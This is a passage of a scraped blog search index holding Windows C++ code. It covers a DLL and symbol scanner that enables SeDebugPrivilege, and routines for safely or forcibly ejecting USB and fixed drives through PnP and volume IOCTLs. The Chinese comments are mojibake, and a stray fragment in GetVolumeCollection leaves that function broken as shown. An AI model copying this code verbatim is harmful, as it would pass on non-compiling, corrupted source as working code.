FreeLibrary(hModuleBase); continue; &#125; &#125; for (int i = 0; i &lt; 0x150; i++) &#123; if (*(pSymAdr + i) == 0x4c &amp;&amp; *(pSymAdr + i + 1) == 0x8d &amp;&amp; *(pSymAdr + i + 2) == 0x5) &#123; int jmpadr = *(int*)(pSymAdr + i + 3); jmpadr = jmpadr + 7; lpDestCall = jmpadr + pSymAdr + i; lpszCFile = CharToWchar((char*)lpDestCall); wprintf(L&quot;Find:%ws %ws\\r\\n&quot;, lpszFilePath, lpszCFile); break; &#125; &#125;#endif FreeLibrary(hModuleBase); &#125; else if (fd.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) &#123; if (StrCmpCW(fd.cFileName, L&quot;.&quot;) != 0 &amp;&amp; StrCmpCW(fd.cFileName, L&quot;..&quot;) != 0) &#123; // æ„é€ å­ç›®å½•çš„è·¯å¾„ TCHAR subDirectory[MAX_PATH]; StringCbCopy(subDirectory, MAX_PATH, Path); StringCbCat(subDirectory, MAX_PATH, L&quot;\\\\&quot;); StringCbCat(subDirectory, MAX_PATH, fd.cFileName); // é€’å½’è°ƒç”¨FindAllDlls if (ENEABLE_DEEP_CALL) &#123; FindAllDlls(subDirectory, iDeep + 1); &#125; &#125; &#125; &#125; &#125; while (FindNextFile(hFind, &amp;fd)); FindClose(hFind);&#125;BOOL EnableXXXPrivilege(LPCTSTR pszPrivilegeName)&#123; HANDLE hToken; LUID seXXXNameValue; TOKEN_PRIVILEGES tkp; // enable the SeXXXPrivilege if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) &#123; wprintf(L&quot;OpenProcessToken() failed, Error = %d %s is not available.\\n&quot;, GetLastError(), pszPrivilegeName); return FALSE; &#125; if (!LookupPrivilegeValue(NULL, pszPrivilegeName, &amp;seXXXNameValue)) &#123; wprintf(L&quot;LookupPrivilegeValue() failed, Error = %d %s is not available.\\n&quot;, GetLastError(), pszPrivilegeName); CloseHandle(hToken); return FALSE; &#125; tkp.PrivilegeCount = 1; tkp.Privileges[0].Luid = seXXXNameValue; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof tkp, NULL, NULL)) &#123; wprintf(L&quot;AdjustTokenPrivileges() failed, Error = %d %s is not available.\\n&quot;, GetLastError(), pszPrivilegeName); CloseHandle(hToken); return FALSE; &#125; CloseHandle(hToken); return TRUE;&#125;// å°†wstringè½¬æ¢æˆstringstring wstring2string(wstring wstr)&#123; string result; //è·å–ç¼“å†²åŒºå¤§å°ï¼Œå¹¶ç”³è¯·ç©ºé—´ï¼Œç¼“å†²åŒºå¤§å°äº‹æŒ‰å­—èŠ‚è®¡ç®—çš„ int len = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), NULL, 0, NULL, NULL); char* buffer = new char[len + 1]; //å®½å­—èŠ‚ç¼–ç è½¬æ¢æˆå¤šå­—èŠ‚ç¼–ç  WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), wstr.size(), buffer, len, NULL, NULL); buffer[len] = &#x27;\\0&#x27;; //åˆ é™¤ç¼“å†²åŒºå¹¶è¿”å›å€¼ result.append(buffer); delete[] buffer; return result;&#125;void OutputToFile(std::vector&lt;std::pair&lt;wstring, wstring&gt;&gt;&amp; vec)&#123; ofstream outfile(&quot;output.txt&quot;); if (!outfile.is_open()) &#123; std::cerr &lt;&lt; &quot;æ— æ³•æ‰“å¼€æ–‡ä»¶&quot; &lt;&lt; std::endl; return; &#125; for (auto res : g_FindReslt) &#123; outfile &lt;&lt; wstring2string(res.first) &lt;&lt; &quot;\\t&quot; &lt;&lt; wstring2string(res.second) &lt;&lt; endl; &#125; // å…³é—­æ–‡ä»¶ outfile.close();&#125;int main(int argc, char* argv[])&#123; PVOID OldValue; if (Wow64DisableWow64FsRedirection(&amp;OldValue)) std::cout &lt;&lt; &quot;File system redirection disabled.&quot; &lt;&lt; std::endl; wcout &lt;&lt; WHITE &lt;&lt; endl; EnableXXXPrivilege(SE_DEBUG_NAME); if (!SymInitializeW(GetCurrentProcess(), NULL, FALSE)) &#123; return 0; &#125; DWORD dwSymOpt = SymGetOptions(); int iDeep = 0; FindAllDlls(ENUM_PATH, iDeep); cout &lt;&lt; endl&lt;&lt; endl; /* for (auto res : g_FindReslt) &#123; wcout &lt;&lt; RED &lt;&lt; res.first &lt;&lt; &quot;\\t&quot; &lt;&lt; res.second &lt;&lt; endl; &#125; */ wcout &lt;&lt; WHITE &lt;&lt; endl; // é‡æ–°å¯ç”¨æ–‡ä»¶ç³»ç»Ÿé‡å®šå‘ if (Wow64RevertWow64FsRedirection(OldValue)) &#123; std::cout &lt;&lt; &quot;File system redirection re-enabled.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Failed to re-enable file system redirection.&quot; &lt;&lt; std::endl; &#125; OutputToFile(g_FindReslt); // ç¨‹åºæ‰§è¡Œå®Œæˆåï¼Œå°†æ§åˆ¶å°çª—å£ç½®é¡¶ HWND consoleWindow = GetConsoleWindow(); // è·å–æ§åˆ¶å°çª—å£å¥æŸ„ ShowWindow(consoleWindow, SW_SHOW); // æ˜¾ç¤ºæ§åˆ¶å°çª—å£ SetForegroundWindow(consoleWindow); // å°†æ§åˆ¶å°çª—å£ç½®é¡¶ return 0;&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"DbgHelp","slug":"A-OS/Windows/DbgHelp","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/DbgHelp/"}]},{"title":"ã€PnPã€‘ CodeCollections","date":"2024-08-09T01:55:45.535Z","path":"A_OS/Windows/PnP/ã€PnPã€‘CodeCollect/","text":"æ¦‚è¿°: PnP ç›¸å…³ä»£ç æ±‡æ€» 1. å¼¹å‡ºUç›˜ 1.1. EjectVolume å¼¹å‡ºUç›˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127STDAPI_(BOOL) EjectVolume(DWORD dwVolLetter)&#123; MYTRACE(L&quot;Enter EjectVolume\\n&quot;); DWORD_PTR lrRet = 0; HWND hWnd = FindWindow(WNDCLASS_CACHEWND, NULL); LRESULT lr = 0; if (NULL != hWnd) &#123; lr = SendMessageTimeout(hWnd, WM_DEREGISTER_UDISK, dwVolLetter, 0, SMTO_BLOCK, 3000, &amp;lrRet); &#125; WCHAR wszVolShort[20] = &#123;&#125;; WCHAR szParentInstanceId[MAX_DEVICE_ID_LEN] = &#123;&#125;; VOLUMECOLLECTION VolCll = &#123;&#125;; BOOL bRet = FALSE; BOOL bUsed = FALSE; HANDLE hVolume = INVALID_HANDLE_VALUE; CONFIGRET conRet = 0; DEVINST dnDevInst = NULL; EnableXXXPrivilege(SE_LOAD_DRIVER_NAME); EnableXXXPrivilege(SE_UNDOCK_NAME); bRet = GetVolumeCollection((BYTE)dwVolLetter, &amp;VolCll, szParentInstanceId); if (!bRet) &#123; MYTRACE(L&quot;Get volume instance id error!\\n&quot;); return FALSE; &#125; StringCchPrintf(wszVolShort, ARRAYSIZE(wszVolShort), L&quot;%c:\\\\&quot;, dwVolLetter); if (!PathFileExists(wszVolShort)) &#123; MYTRACE(L&quot;Not Find Volume:%c, Delete letter\\n&quot;, dwVolLetter); return TRUE; &#125; // ä¸è¦ç›´æ¥å°è¯•å¼¹å‡º // å…ˆåˆ¤æ–­æ˜¯å¦å ç”¨ DWORD volumeFlags = GENERIC_READ | GENERIC_WRITE; hVolume = CreateVolumeHandleFromDriveLetter((WCHAR)dwVolLetter,volumeFlags); if (INVALID_HANDLE_VALUE == hVolume) &#123; MYTRACE(L&quot;ERROR! Can not open volume! Maybe it&#x27;s locked\\n&quot;); return FALSE; &#125; else &#123; CloseHandle(hVolume); hVolume = INVALID_HANDLE_VALUE; &#125; PNP_VETO_TYPE VetoType; bRet = CMRequestRemoveDev(dwVolLetter, szParentInstanceId, VetoType); if (!bRet) &#123; switch (VetoType) &#123; case PNP_VetoTypeUnknown: MYTRACE(L&quot;[Eject] for unspecified reason&quot;); break; case PNP_VetoLegacyDevice: MYTRACE(L&quot;[Eject] due to legacy device&quot;); break; case PNP_VetoPendingClose: MYTRACE(L&quot;[Eject] due to pending close&quot;); break; case PNP_VetoWindowsApp: MYTRACE(L&quot;[Eject] due to windows application&quot;); break; case PNP_VetoWindowsService: MYTRACE(L&quot;[Eject] due to service&quot;); break; case PNP_VetoOutstandingOpen: MYTRACE(L&quot;[Eject] due to outstanding handles on device&quot;); break; case PNP_VetoDevice: MYTRACE(L&quot;[Eject] by device&quot;); break; case PNP_VetoDriver: MYTRACE(L&quot;[Eject] by driver&quot;); break; case PNP_VetoIllegalDeviceRequest: &#123; MYTRACE(L&quot;[Eject] as the request was invalid for the device&quot;); if (EjectVolumeForce(dwVolLetter)) &#123; CMRequestRemoveDev(dwVolLetter, szParentInstanceId, VetoType); bRet = TRUE; &#125; &#125; break; case PNP_VetoInsufficientPower: MYTRACE(L&quot;[Eject] because there would be insufficient system power to continue&quot;); break; case PNP_VetoNonDisableable: MYTRACE(L&quot;[Eject] due to non-disableable device&quot;); break; case PNP_VetoLegacyDriver: MYTRACE(L&quot;[Eject] due to legacy driver&quot;); break; case PNP_VetoInsufficientRights: MYTRACE(L&quot;[Eject] insufficient permissions&quot;); break; default: MYTRACE(L&quot;[Eject] due to uncoded reason&quot;); break; &#125; &#125; return bRet;&#125; 1.2. GetVolumeCollection è·å–è®¾å¤‡ID 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239STDAPI_(BOOL) GetVolumeCollection(BYTE byVolLetter, PVOLUMECOLLECTION pVolCll, LPWSTR pParentInstId)&#123; WCHAR szParentInstanceId[MAX_DEVICE_ID_LEN] = &#123;&#125;; WCHAR szTmpInstanceId[MAX_DEVICE_ID_LEN] =&#123;&#125;; WCHAR szDriveLetters[26*2*4] =&#123;&#125;; BOOL bRet; DWORD cbBytesReturned; LPWSTR pszDriveRoot = NULL; size_t uStrlen; pVolCll-&gt;dwCount = 0; bRet = GetParentInstanceId(byVolLetter, szParentInstanceId, NULL, 0); if (!bRet) return FALSE; pszLogicalDrives); cbBytesReturned = GetLogicalDriveStrings (ARRAYSIZE(szDriveLetters)*sizeof(WCHAR), szDriveLetters); for (pszDriveRoot = szDriveLetters; *pszDriveRoot != TEXT(&#x27;\\0&#x27;); pszDriveRoot += uStrlen + 1) &#123; StringCchLength(pszDriveRoot, 26*2*4, &amp;uStrlen); if (((BYTE)(*pszDriveRoot) == &#x27;A&#x27;) || ((BYTE)(*pszDriveRoot) == &#x27;a&#x27;) || ((BYTE)(*pszDriveRoot) == &#x27;B&#x27;) || ((BYTE)(*pszDriveRoot) == &#x27;b&#x27;)) //skip floppy and the target volume continue; bRet = GetParentInstanceId((BYTE)(*pszDriveRoot), szTmpInstanceId, NULL, 0); if (bRet &amp;&amp; (StrCmpI(szParentInstanceId,szTmpInstanceId) == 0)) &#123; pVolCll-&gt;byVolume[pVolCll-&gt;dwCount] = (BYTE)(*pszDriveRoot); pVolCll-&gt;dwCount++; &#125; &#125; if (pParentInstId) StringCchCopy(pParentInstId, MAX_DEVICE_ID_LEN, szParentInstanceId); return TRUE;&#125;BOOL GetParentInstanceId(BYTE byVolLetter,LPWSTR pParentInstId, LPWSTR pParentDevName,DWORD dwBufSize)&#123; HANDLE hDevice = INVALID_HANDLE_VALUE; WCHAR szDeviceName[8]; STORAGE_PROPERTY_QUERY spq; STORAGE_DEVICE_NUMBER sdn; STORAGE_DEVICE_NUMBER sdnTmp; BOOL bSuccess; DWORD cbBytesReturned; BYTE byBuffer[4096]; BOOL bRet = FALSE; GUID *pGuidInferface = NULL;// GUID *pGuidClass = NULL; HDEVINFO hIntDevInfo = INVALID_HANDLE_VALUE; DWORD dwIndex; SP_DEVICE_INTERFACE_DATA interfaceData; SP_DEVINFO_DATA deviceInfoData; CONFIGRET configret; DEVINST dnDevInstParent; WCHAR szDeviceInstanceID[MAX_DEVICE_ID_LEN]=&#123;&#125;; HANDLE hDev = INVALID_HANDLE_VALUE; PSP_DEVICE_INTERFACE_DETAIL_DATA pInterfaceDetailData = NULL; StringCchPrintf(szDeviceName, ARRAYSIZE(szDeviceName), L&quot;\\\\\\\\.\\\\%c:&quot;, byVolLetter); hDevice = CreateFile (szDeviceName, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); if (hDevice == INVALID_HANDLE_VALUE) &#123; return FALSE; &#125; spq.PropertyId = StorageDeviceProperty; spq.QueryType = PropertyStandardQuery; spq.AdditionalParameters[0] = 0; bSuccess = DeviceIoControl (hDevice, IOCTL_STORAGE_QUERY_PROPERTY, &amp;spq, sizeof(spq), &amp;byBuffer, sizeof(byBuffer), &amp;cbBytesReturned, (LPOVERLAPPED) NULL); STORAGE_DEVICE_DESCRIPTOR *psdp = (STORAGE_DEVICE_DESCRIPTOR *)byBuffer; if (!bSuccess || psdp-&gt;BusType != BusTypeUsb) //Not USB device, just return &#123; CloseHandle (hDevice); return FALSE; &#125; bSuccess = DeviceIoControl (hDevice, IOCTL_STORAGE_GET_DEVICE_NUMBER, NULL, 0, (LPVOID)&amp;sdn, sizeof(sdn), &amp;cbBytesReturned, (LPOVERLAPPED) NULL); // GetLastError of ERROR_MORE_DATA indicates to the caller that the buffer was not large enough to accommodate the data requested if (!bSuccess) &#123; CloseHandle (hDevice); return FALSE; &#125; if (sdn.DeviceType == FILE_DEVICE_CD_ROM || sdn.DeviceType == FILE_DEVICE_DVD) &#123; pGuidInferface = (GUID*)&amp;GUID_DEVINTERFACE_CDROM; // pGuidClass = (GUID*)&amp;GUID_DEVCLASS_CDROM; &#125; else //if (sdn.DeviceType == FILE_DEVICE_DISK) &#123; pGuidInferface = (GUID*)&amp;GUID_DEVINTERFACE_DISK; // pGuidClass = (GUID*)&amp;GUID_DEVCLASS_DISKDRIVE; &#125; CloseHandle (hDevice); hDevice = INVALID_HANDLE_VALUE; hIntDevInfo = SetupDiGetClassDevs (pGuidInferface, NULL, NULL, DIGCF_PRESENT | DIGCF_DEVICEINTERFACE); if (INVALID_HANDLE_VALUE == hIntDevInfo) return FALSE; for (dwIndex = 0; ;dwIndex ++) &#123; ZeroMemory(&amp;interfaceData, sizeof(interfaceData)); interfaceData.cbSize = sizeof(interfaceData); bSuccess = SetupDiEnumDeviceInterfaces (hIntDevInfo, NULL, pGuidInferface, dwIndex, &amp;interfaceData); if (!bSuccess) &#123; DWORD dwErrorCode = GetLastError(); if (dwErrorCode == ERROR_NO_MORE_ITEMS) break; //else // break; // ERROR!!! &#125; cbBytesReturned = 0; bSuccess = SetupDiGetDeviceInterfaceDetail (hIntDevInfo, &amp;interfaceData, NULL, 0, &amp;cbBytesReturned, NULL); if ((!bSuccess &amp;&amp; GetLastError() != ERROR_INSUFFICIENT_BUFFER) || cbBytesReturned == 0) continue; // ERROR!!! if (pInterfaceDetailData) pInterfaceDetailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA) LocalFree (pInterfaceDetailData); pInterfaceDetailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA) LocalAlloc (LPTR, cbBytesReturned); pInterfaceDetailData-&gt;cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA); ZeroMemory (&amp;deviceInfoData, sizeof(deviceInfoData)); deviceInfoData.cbSize = sizeof(deviceInfoData); bSuccess = SetupDiGetDeviceInterfaceDetail (hIntDevInfo, &amp;interfaceData, pInterfaceDetailData, cbBytesReturned, &amp;cbBytesReturned, &amp;deviceInfoData); if (!bSuccess) continue; hDev = CreateFile (pInterfaceDetailData-&gt;DevicePath, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); if (hDev == INVALID_HANDLE_VALUE) continue; //ERROR bSuccess = DeviceIoControl (hDev, IOCTL_STORAGE_GET_DEVICE_NUMBER, NULL, 0, (LPVOID)&amp;sdnTmp, sizeof(sdnTmp), &amp;cbBytesReturned, (LPOVERLAPPED) NULL); CloseHandle(hDev); if (!bSuccess) continue; if ((sdn.DeviceType != sdnTmp.DeviceType) || (sdn.DeviceNumber != sdnTmp.DeviceNumber)) &#123; continue; &#125; //found the device // MYTRACE(L&quot;pInterfaceDetailData-&gt;DevicePath: %s&quot;, pInterfaceDetailData-&gt;DevicePath); configret = CM_Get_Parent (&amp;dnDevInstParent, deviceInfoData.DevInst, 0); if (CR_SUCCESS != configret) break; configret = CM_Get_Device_ID (dnDevInstParent, szDeviceInstanceID, ARRAYSIZE(szDeviceInstanceID), 0); if (CR_SUCCESS != configret) break; if (pParentInstId) StringCchCopy(pParentInstId, MAX_DEVICE_ID_LEN, szDeviceInstanceID); if (pParentDevName &amp;&amp; dwBufSize &gt; 8) &#123; LPWSTR pDevName = pInterfaceDetailData-&gt;DevicePath; LPWSTR pfind = StrStrI(pDevName, L&quot;ven_&quot;); if (pfind) &#123; pDevName = pfind + 4; pfind = StrChr(pDevName, &#x27;&amp;&#x27;); StringCbCopyN(pParentDevName, dwBufSize, pDevName, (pfind-pDevName)*sizeof(WCHAR)); StringCbCat(pParentDevName, dwBufSize, L&quot; &quot;); pDevName = pInterfaceDetailData-&gt;DevicePath; &#125; pfind = StrStrI(pDevName, L&quot;prod_&quot;); if (pfind) &#123; pDevName = pfind + 5; pfind = StrChr(pDevName, &#x27;&amp;&#x27;); StringCbCatN(pParentDevName, dwBufSize, pDevName, (pfind-pDevName)*sizeof(WCHAR)); &#125; //replace &#x27;_&#x27; with &#x27; &#x27; pDevName = pParentDevName; do &#123; pfind = StrChr(pDevName, &#x27;_&#x27;); if (!pfind) break; *pfind = &#x27; &#x27;; pDevName = pfind +1; &#125;while(1); wcsupr(pParentDevName); //_wcsupr_s(pParentDevName, wcslen()); &#125; bRet = TRUE; //Success break; &#125; if (pInterfaceDetailData) LocalFree( pInterfaceDetailData); if (hIntDevInfo ) SetupDiDestroyDeviceInfoList(hIntDevInfo); return bRet;&#125; 1.3. CMRequestRemoveDev ç§»é™¤è®¾å¤‡ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051BOOL CMRequestRemoveDev(DWORD dwVolLetter, WCHAR* szParentInstanceId, PNP_VETO_TYPE&amp; VetoType)&#123; DEVINST dnDevInst = NULL; DEVINST parentDevInst = NULL; VOLUMECOLLECTION VolCll = &#123;&#125;; CONFIGRET conRet = 0; conRet = CM_Locate_DevNode(&amp;dnDevInst, szParentInstanceId, NULL); if (conRet == CR_SUCCESS) &#123; WCHAR szVetoName[MAX_PATH] = &#123; 0 &#125;; MYTRACE(L&quot;CM_Request_Device_Eject_Ex&quot;); conRet = CM_Request_Device_Eject_Ex(dnDevInst, &amp;VetoType, szVetoName, MAX_PATH, 0, NULL); MYTRACE(L&quot;CM_Request_Device_Eject_Ex ! rt:%d, VetoType:%d, info:%s&quot;, conRet, VetoType, szVetoName); if (conRet == CR_SUCCESS) &#123; MYTRACE(L&quot;CM_Request_Device_Eject_Ex SUCCESS!\\n&quot;); return TRUE; &#125; else &#123; if (conRet == CR_REMOVE_VETOED &amp;&amp; VetoType == PNP_VetoIllegalDeviceRequest) &#123; conRet = CM_Query_And_Remove_SubTree(dnDevInst, &amp;VetoType, szVetoName, MAX_PATH, // We have to add the `CM_REMOVE_NO_RESTART` flag because // otherwise the just-removed device may be immediately // redetected, which might happen on XP and Vista. // See https://www.codeproject.com/articles/13839/how-to-prepare-a-usb-drive-for-safe-removal CM_REMOVE_NO_RESTART); if (conRet == CR_SUCCESS) &#123; return TRUE; &#125; &#125; MYTRACE(L&quot;CM_Request_Device_Eject_Ex FAILED! rt:%d, VetoType:%d, info:%s&quot;, conRet, VetoType, szVetoName); &#125; &#125; MYTRACE(L&quot;CM_Locate_DevNode eject %d volume(s) error!\\n&quot;, VolCll.dwCount); return FALSE;&#125; 2. å¼ºåˆ¶å¼¹å‡ºUç›˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130BOOL LockVolume(HANDLE volume) &#123; DWORD bytesReturned; for (size_t tries = 0; tries &lt; 20; tries++) &#123; if (DeviceIoControl(volume, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &amp;bytesReturned, NULL)) &#123; return TRUE; &#125; Sleep(500); &#125; return FALSE;&#125;BOOL UnlockVolume(HANDLE volume)&#123; DWORD bytesReturned; return DeviceIoControl(volume, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &amp;bytesReturned, NULL);&#125;STDAPI_(BOOL) EjectVolumeForce(DWORD dwVolLetter)&#123; BOOL bRet = FALSE; WCHAR wszVolShort[20] = &#123;&#125;; DWORD dwReturn = 0; HANDLE hVolume = INVALID_HANDLE_VALUE; StringCchPrintf(wszVolShort, ARRAYSIZE(wszVolShort), L&quot;%c:\\\\&quot;, dwVolLetter); DWORD volumeFlags = GENERIC_READ | GENERIC_WRITE; hVolume = CreateVolumeHandleFromDriveLetter(dwVolLetter, volumeFlags); if (hVolume == INVALID_HANDLE_VALUE) &#123; MYTRACE(L&quot;ERROR! Can not open volume!\\n&quot;); return FALSE; &#125; do &#123; if (DRIVE_FIXED == GetDriveType(wszVolShort)) &#123; MYTRACE(L&quot;DRIVE_FIXED == GetDriveType&quot;); ULONG deviceNumber = GetDeviceNumberFromVolumeHandle(hVolume); if (!deviceNumber) &#123; MYTRACE(L&quot;Couldn&#x27;t get device number from volume handle&quot;); bRet = FALSE; break; &#125; if (!CloseHandle(hVolume)) &#123; MYTRACE(L&quot;Couldn&#x27;t close volume handle&quot;); break; &#125; MYTRACE(L&quot;Ejecting fixed drive&quot;); bRet = EjectFixedDriveByDeviceNumber(deviceNumber); break; &#125; if (!LockVolume(hVolume)) &#123; MYTRACE(L&quot;LockVolume Failed&quot;); break; &#125; // å¼€å§‹æš´åŠ›å¼¹å‡º if (DeviceIoControl(hVolume, FSCTL_DISMOUNT_VOLUME, NULL, 0, NULL, 0, &amp;dwReturn, NULL)) &#123; DWORD dwTmp = 0; MYTRACE(L&quot;IOCTL_STORAGE_MEDIA_REMOVAL&quot;); bRet = DeviceIoControl(hVolume, IOCTL_STORAGE_MEDIA_REMOVAL, &amp;dwTmp, sizeof(dwTmp), NULL, 0, &amp;dwReturn, NULL); MYTRACE(L&quot;IOCTL_STORAGE_MEDIA_REMOVAL, bRet==%d&quot;, bRet); bRet = DeviceIoControl(hVolume, IOCTL_DISK_EJECT_MEDIA, NULL, 0, NULL, 0, &amp;dwReturn, NULL); MYTRACE(L&quot;IOCTL_DISK_EJECT_MEDIA bRet==%d&quot;, bRet); bRet = DeviceIoControl(hVolume, IOCTL_STORAGE_EJECT_MEDIA, NULL, 0, NULL, 0, &amp;dwReturn, NULL); MYTRACE(L&quot;IOCTL_STORAGE_EJECT_MEDIA bRet==%d&quot;, bRet); &#125; if (!UnlockVolume(hVolume)) &#123; MYTRACE(L&quot;UnlockVolume Failed&quot;); break; &#125; // å¼¹å‡ºæ˜¯å¦æˆåŠŸ if (!PathFileExists(wszVolShort)) &#123; DeleteJunctionPoint(dwVolLetter); bRet = TRUE; break; &#125; else &#123; bRet = FALSE; break; &#125; &#125; while (0); if (INVALID_HANDLE_VALUE != hVolume) &#123; CloseHandle(hVolume); hVolume = INVALID_HANDLE_VALUE; &#125; // é¿å…ä¸ç”Ÿæ•ˆï¼Œå¤šè°ƒç”¨å‡ ä¸ª // RefreshFolderViews(CSIDL_DESKTOP, SHCNE_UPDATEDIR); NotifyDeviceRemoval(dwVolLetter); SHChangeNotify(SHCNE_DRIVEREMOVED, SHCNF_PATH, wszVolShort, NULL); SHChangeNotify(SHCNE_DRIVEADD, SHCNF_PATH, wszVolShort, NULL); return bRet;&#125; 3. å¼¹å‡ºç¡¬ç›˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166// Adapted from https://www.codeproject.com/articles/13839/how-to-prepare-a-usb-drive-for-safe-removal// which is licensed under &quot;The Code Project Open License (CPOL) 1.02&quot;// https://www.codeproject.com/info/cpol10.aspxDEVINST GetDeviceInstanceFromDeviceNumber(ULONG deviceNumber) &#123; const GUID* guid = reinterpret_cast&lt;const GUID*&gt;(&amp;GUID_DEVINTERFACE_DISK); // Get device interface info set handle for all devices attached to system DWORD deviceInformationFlags = DIGCF_PRESENT | DIGCF_DEVICEINTERFACE; HDEVINFO deviceInformation = SetupDiGetClassDevs(guid, NULL, NULL, deviceInformationFlags); if (deviceInformation == INVALID_HANDLE_VALUE) &#123; return 0; &#125; DWORD memberIndex = 0; BYTE buffer[1024]; PSP_DEVICE_INTERFACE_DETAIL_DATA deviceInterfaceDetailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA)buffer; SP_DEVINFO_DATA deviceInformationData; DWORD requiredSize; SP_DEVICE_INTERFACE_DATA deviceInterfaceData; deviceInterfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA); while (true) &#123; if (!SetupDiEnumDeviceInterfaces(deviceInformation, NULL, guid, memberIndex, &amp;deviceInterfaceData)) &#123; break; &#125; requiredSize = 0; SetupDiGetDeviceInterfaceDetail(deviceInformation, &amp;deviceInterfaceData, NULL, 0, &amp;requiredSize, NULL); if (requiredSize == 0 || requiredSize &gt; sizeof(buffer)) &#123; memberIndex++; continue; &#125; deviceInterfaceDetailData-&gt;cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA); ZeroMemory((PVOID)&amp;deviceInformationData, sizeof(SP_DEVINFO_DATA)); deviceInformationData.cbSize = sizeof(SP_DEVINFO_DATA); BOOL result = SetupDiGetDeviceInterfaceDetail(deviceInformation, &amp;deviceInterfaceData, deviceInterfaceDetailData, sizeof(buffer), &amp;requiredSize, &amp;deviceInformationData); if (!result) &#123; memberIndex++; continue; &#125; LPCTSTR devicePath = deviceInterfaceDetailData-&gt;DevicePath; HANDLE driveHandle = CreateVolumeHandleFromDevicePath(devicePath, 0); if (driveHandle == INVALID_HANDLE_VALUE) &#123; memberIndex++; continue; &#125; ULONG currentDriveDeviceNumber = GetDeviceNumberFromVolumeHandle(driveHandle); CloseHandle(driveHandle); if (!currentDriveDeviceNumber) &#123; memberIndex++; continue; &#125; if (deviceNumber == currentDriveDeviceNumber) &#123; SetupDiDestroyDeviceInfoList(deviceInformation); return deviceInformationData.DevInst; &#125; memberIndex++; &#125; SetupDiDestroyDeviceInfoList(deviceInformation); return 0;&#125;BOOL EjectFixedDriveByDeviceNumber(ULONG deviceNumber) &#123; DEVINST deviceInstance = GetDeviceInstanceFromDeviceNumber(deviceNumber); if (!deviceInstance) &#123; MYTRACE(L&quot;Couldn&#x27;t get instance from device number&quot;); return FALSE; &#125; CONFIGRET status; PNP_VETO_TYPE vetoType = PNP_VetoTypeUnknown; WCHAR szVetoName[MAX_PATH]; // It&#x27;s often seen that the removal fails on the first // attempt but works on the second attempt. // See https://www.codeproject.com/articles/13839/how-to-prepare-a-usb-drive-for-safe-removal for (size_t tries = 0; tries &lt; 3; tries++) &#123; if (tries != 0) &#123; MYTRACE(L&quot;Retrying&quot;); Sleep(500); &#125; MYTRACE(L&quot;Ejecting device instance&quot;); status = CM_Request_Device_Eject(deviceInstance, &amp;vetoType, szVetoName, MAX_PATH, 0); if (status == CR_SUCCESS) &#123; MYTRACE(L&quot;Ejected device instance successfully&quot;); return TRUE; &#125; MYTRACE(L&quot;Ejecting was vetoed&quot;); // We use this as an indicator that the device driver // is not setting the `SurpriseRemovalOK` capability. // See https://msdn.microsoft.com/en-us/library/windows/hardware/ff539722(v=vs.85).aspx if (status == CR_REMOVE_VETOED &amp;&amp; vetoType == PNP_VetoIllegalDeviceRequest) &#123; MYTRACE(L&quot;Removing subtree&quot;); status = CM_Query_And_Remove_SubTree(deviceInstance, &amp;vetoType, szVetoName, MAX_PATH, CM_REMOVE_NO_RESTART); if (status == CR_ACCESS_DENIED) &#123; return FALSE; &#125; if (status == CR_SUCCESS) &#123; return TRUE; &#125; MYTRACE(L&quot;Couldn&#x27;t eject device instance&quot;); return FALSE; &#125; &#125; return FALSE;&#125; 4. è·å–è®¾å¤‡æ•° 123456789101112131415bool GetDeviceNumber(HANDLE deviceHandle, STORAGE_DEVICE_NUMBER&amp; deviceNumber) &#123; DWORD bytesReturned = 0; BOOL result = DeviceIoControl( deviceHandle, IOCTL_STORAGE_GET_DEVICE_NUMBER, NULL, 0, &amp;deviceNumber, sizeof(STORAGE_DEVICE_NUMBER), &amp;bytesReturned, NULL ); return result != 0;&#125; 5. è·å–è®¾å¤‡ID 12345678910111213141516171819bool GetDeviceInstanceId(HDEVINFO deviceInfoSet, SP_DEVINFO_DATA&amp; deviceInfoData, std::wstring&amp; deviceInstanceId) &#123; WCHAR buffer[1024]; DWORD requiredSize = 0; BOOL result = SetupDiGetDeviceInstanceIdW( deviceInfoSet, 